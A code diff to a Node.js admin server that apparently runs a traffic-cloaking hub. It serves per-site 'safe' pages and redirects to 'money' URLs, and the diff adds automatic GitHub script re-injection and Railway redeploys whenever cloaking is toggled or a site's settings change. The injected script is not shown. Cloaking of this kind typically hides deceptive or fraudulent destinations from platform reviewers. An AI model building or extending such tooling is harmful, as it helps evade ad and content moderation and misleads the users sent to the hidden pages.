@@ -258,6 +258,40 @@ async function githubInject(site, hubUrl) {
   }
 }
 
+async function railwayDeploy(site) {
+  var token = process.env.RAILWAY_API_TOKEN;
+  if (!token || !site.railwayProjectId || !site.railwayServiceId) return null;
+  try {
+    // Step 1: get latest deployment ID
+    var qStr = JSON.stringify({ query: 'query { deployments(input: { projectId: "' + site.railwayProjectId + '", serviceId: "' + site.railwayServiceId + '" }) { edges { node { id status } } } }' });
+    var depId = await new Promise(function(resolve) {
+      var opts = { hostname:'backboard.railway.app', path:'/graphql/v2', method:'POST', headers:{'Authorization':'Bearer '+token,'Content-Type':'application/json','Content-Length':Buffer.byteLength(qStr)} };
+      var rq = https.request(opts, function(rs) {
+        var d = ''; rs.on('data', c => d += c);
+        rs.on('end', function() {
+          try { var p = JSON.parse(d); var e = p.data && p.data.deployments && p.data.deployments.edges; resolve(e && e.length ? e[0].node.id : null); } catch(err) { resolve(null); }
+        });
+      });
+      rq.on('error', () => resolve(null)); rq.setTimeout(8000, () => { rq.destroy(); resolve(null); });
+      rq.write(qStr); rq.end();
+    });
+    if (!depId) return null;
+    // Step 2: redeploy via mutation
+    var mStr = JSON.stringify({ query: 'mutation { deploymentRedeploy(id: "' + depId + '") { id } }' });
+    return new Promise(function(resolve) {
+      var opts = { hostname:'backboard.railway.app', path:'/graphql/v2', method:'POST', headers:{'Authorization':'Bearer '+token,'Content-Type':'application/json','Content-Length':Buffer.byteLength(mStr)} };
+      var rq = https.request(opts, function(rs) {
+        var d = ''; rs.on('data', c => d += c);
+        rs.on('end', function() {
+          try { var p = JSON.parse(d); resolve({ ok: !!(p.data && p.data.deploymentRedeploy) }); } catch(err) { resolve({ ok: false }); }
+        });
+      });
+      rq.on('error', () => resolve({ ok:false })); rq.setTimeout(8000, () => { rq.destroy(); resolve({ ok:false }); });
+      rq.write(mStr); rq.end();
+    });
+  } catch(e) { return null; }
+}
+
 async function getRailwayStatus(site) {
   var token = process.env.RAILWAY_API_TOKEN;
   if (!token || !site.railwayProjectId || !site.railwayServiceId) return null;
@@ -760,10 +794,27 @@ app.post('/admin/settings', requireAdmin, function(req, res) {
 });
 
 // ─── Admin toggle cloaking ────────────────────────────────────────────────────
-app.post('/admin/toggle', requireAdmin, function(req, res) {
+app.post('/admin/toggle', requireAdmin, async function(req, res) {
   var settings = readSettings();
   settings.enabled = !settings.enabled;
   writeSettings(settings);
+  // Re-inject script + trigger Railway redeploy for default site
+  var sites = readSites();
+  var defSite = sites.find(function(s) { return s.isDefault; });
+  if (defSite && defSite.githubRepo && process.env.GITHUB_TOKEN) {
+    var hubUrl = 'https://' + (process.env.REPLIT_DEV_DOMAIN || req.headers.host || 'localhost');
+    githubInject(defSite, hubUrl).then(function(r) {
+      if (r && r.ok) {
+        railwayDeploy(defSite).then(function(dr) {
+          if (dr && dr.ok) {
+            var ss = readSites(); var si = ss.findIndex(function(x) { return x.isDefault; });
+            if (si !== -1) { ss[si].deployStatus = 'building'; writeSites(ss); }
+          }
+          setTimeout(pollRailwayStatuses, 30000);
+        }).catch(function() { setTimeout(pollRailwayStatuses, 30000); });
+      }
+    }).catch(function() {});
+  }
   res.redirect('/admin');
 });
 
@@ -885,14 +936,23 @@ app.post('/admin/sites', requireAdmin, async function(req, res) {
   // Fire GitHub inject in background — don't block redirect
   if (githubRepo && process.env.GITHUB_TOKEN) {
     githubInject(newSite, hubUrl).then(function(r) {
-      if (r.ok) {
+      if (r && r.ok) {
         var ss = readSites();
         for (var i = 0; i < ss.length; i++) {
           if (ss[i].id === id) { ss[i].deployStatus = 'pushed'; break; }
         }
         writeSites(ss);
-        // Poll Railway 30s after push to pick up deployment start
-        setTimeout(pollRailwayStatuses, 30000);
+        // Trigger Railway redeploy, update status to building, then poll
+        railwayDeploy(newSite).then(function(dr) {
+          if (dr && dr.ok) {
+            var ss2 = readSites();
+            for (var j = 0; j < ss2.length; j++) {
+              if (ss2[j].id === id) { ss2[j].deployStatus = 'building'; break; }
+            }
+            writeSites(ss2);
+          }
+          setTimeout(pollRailwayStatuses, 30000);
+        }).catch(function() { setTimeout(pollRailwayStatuses, 30000); });
       }
     }).catch(function() {});
   }
@@ -930,15 +990,21 @@ app.post('/admin/sites/:id/settings', requireAdmin, async function(req, res) {
   sites[idx] = site;
   writeSites(sites);
 
-  // Re-inject if GitHub repo set and token available
+  // Re-inject if GitHub repo set and token available, then trigger Railway redeploy
   if (site.githubRepo && process.env.GITHUB_TOKEN) {
     githubInject(site, hubUrl).then(function(r) {
       if (r && r.ok) {
-        // Update status to pushed and schedule Railway poll
         var ss = readSites();
         var si = ss.findIndex(function(x) { return x.id === id; });
         if (si !== -1) { ss[si].deployStatus = 'pushed'; writeSites(ss); }
-        setTimeout(pollRailwayStatuses, 30000);
+        // Trigger Railway redeploy, then poll for live status
+        railwayDeploy(site).then(function(dr) {
+          if (dr && dr.ok) {
+            var ss2 = readSites(); var si2 = ss2.findIndex(function(x) { return x.id === id; });
+            if (si2 !== -1) { ss2[si2].deployStatus = 'building'; writeSites(ss2); }
+          }
+          setTimeout(pollRailwayStatuses, 30000);
+        }).catch(function() { setTimeout(pollRailwayStatuses, 30000); });
       }
     }).catch(function() {});
   }
@@ -958,10 +1024,21 @@ app.post('/admin/sites/:id/regenerate-key', requireAdmin, async function(req, re
   sites[idx].deployStatus = 'key-rotated';
   writeSites(sites);
 
-  // Re-inject with new key and schedule Railway status poll
+  // Re-inject with new key, trigger Railway redeploy, then poll status
   if (sites[idx].githubRepo && process.env.GITHUB_TOKEN) {
-    githubInject(sites[idx], hubUrl).then(function(r) {
-      if (r && r.ok) setTimeout(pollRailwayStatuses, 30000);
+    var siteSnapshot = sites[idx];
+    githubInject(siteSnapshot, hubUrl).then(function(r) {
+      if (r && r.ok) {
+        var ss = readSites(); var si = ss.findIndex(function(x) { return x.id === id; });
+        if (si !== -1) { ss[si].deployStatus = 'pushed'; writeSites(ss); }
+        railwayDeploy(siteSnapshot).then(function(dr) {
+          if (dr && dr.ok) {
+            var ss2 = readSites(); var si2 = ss2.findIndex(function(x) { return x.id === id; });
+            if (si2 !== -1) { ss2[si2].deployStatus = 'building'; writeSites(ss2); }
+          }
+          setTimeout(pollRailwayStatuses, 30000);
+        }).catch(function() { setTimeout(pollRailwayStatuses, 30000); });
+      }
     }).catch(function() {});
   }
 
@@ -978,12 +1055,28 @@ app.post('/admin/sites/:id/delete', requireAdmin, function(req, res) {
   res.redirect('/admin');
 });
 
-app.post('/admin/sites/:id/toggle', requireAdmin, function(req, res) {
+app.post('/admin/sites/:id/toggle', requireAdmin, async function(req, res) {
   var id = req.params.id;
   var sites = readSites();
   var idx = sites.findIndex(function(s) { return s.id === id; });
-  if (idx !== -1) { sites[idx].enabled = !sites[idx].enabled; writeSites(sites); }
-  var qs = (sites[idx] && !sites[idx].isDefault) ? '?site=' + id : '';
+  if (idx !== -1) {
+    sites[idx].enabled = !sites[idx].enabled;
+    writeSites(sites);
+    // Re-inject script so GitHub/Railway picks up the change
+    var hubUrl = 'https://' + (process.env.REPLIT_DEV_DOMAIN || req.headers.host || 'localhost');
+    if (sites[idx].githubRepo && process.env.GITHUB_TOKEN) {
+      githubInject(sites[idx], hubUrl).then(function(r) {
+        if (r && r.ok) {
+          var ss = readSites(); var si = ss.findIndex(function(x) { return x.id === id; });
+          if (si !== -1) { ss[si].deployStatus = 'pushed'; writeSites(ss); }
+          // Trigger Railway redeploy and then poll status
+          railwayDeploy(sites[idx]).catch(function(){});
+          setTimeout(pollRailwayStatuses, 30000);
+        }
+      }).catch(function() {});
+    }
+  }
+  var qs = (idx !== -1 && sites[idx] && !sites[idx].isDefault) ? '?site=' + id : '';
   res.redirect('/admin' + qs);
 });
 
@@ -991,7 +1084,8 @@ app.post('/admin/sites/:id/toggle', requireAdmin, function(req, res) {
 app.get('/sites/:siteId/safe', function(req, res) {
   var sites = readSites();
   var site = sites.find(function(s) { return s.id === req.params.siteId; });
-  var siteName = site ? escHtml(site.name) : 'this service';
+  if (!site) return res.status(404).send('Site not found.');
+  var siteName = escHtml(site.name);
   res.send(`<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -1021,7 +1115,8 @@ p{font-size:0.9rem;color:#aaa;max-width:400px;line-height:1.6}
 app.get('/sites/:siteId/money', function(req, res) {
   var sites = readSites();
   var site = sites.find(function(s) { return s.id === req.params.siteId; });
-  var target = (site && site.moneyUrl) ? site.moneyUrl : '/';
+  if (!site) return res.status(404).send('Site not found.');
+  var target = site.moneyUrl || '/';
   res.redirect(302, target);
 });
 
@@ -1529,8 +1624,8 @@ function adminDashboardPage(settings, logs, leads, opts) {
 
   // ── New site list rows for FILTER UI ─────────────────────────────────────
   var siteListHtml = sites.map(function(s) {
-    var dsCls = { live:'db-live', pushed:'db-pushed', pending:'db-pending', failed:'db-failed', 'key-rotated':'db-rotated' }[s.deployStatus] || 'db-pending';
-    var dsLabel = { live:'Live', pushed:'GitHub ✓', pending:'Pending', failed:'Failed', 'key-rotated':'Key Rotated' }[s.deployStatus] || 'Pending';
+    var dsCls = { live:'db-live', pushed:'db-pushed', building:'db-pushed', pending:'db-pending', failed:'db-failed', 'key-rotated':'db-rotated' }[s.deployStatus] || 'db-pending';
+    var dsLabel = { live:'Live', pushed:'GitHub ✓', building:'Deploying…', pending:'Pending', failed:'Failed', 'key-rotated':'Key Rotated' }[s.deployStatus] || 'Pending';
     var mk  = s.apiKey ? s.apiKey.slice(0, 8) + '••••' + s.apiKey.slice(-4) : '—';
     var safeHref  = hubUrl + '/sites/' + s.id + '/safe';
     var moneyHref = hubUrl + '/sites/' + s.id + '/money';
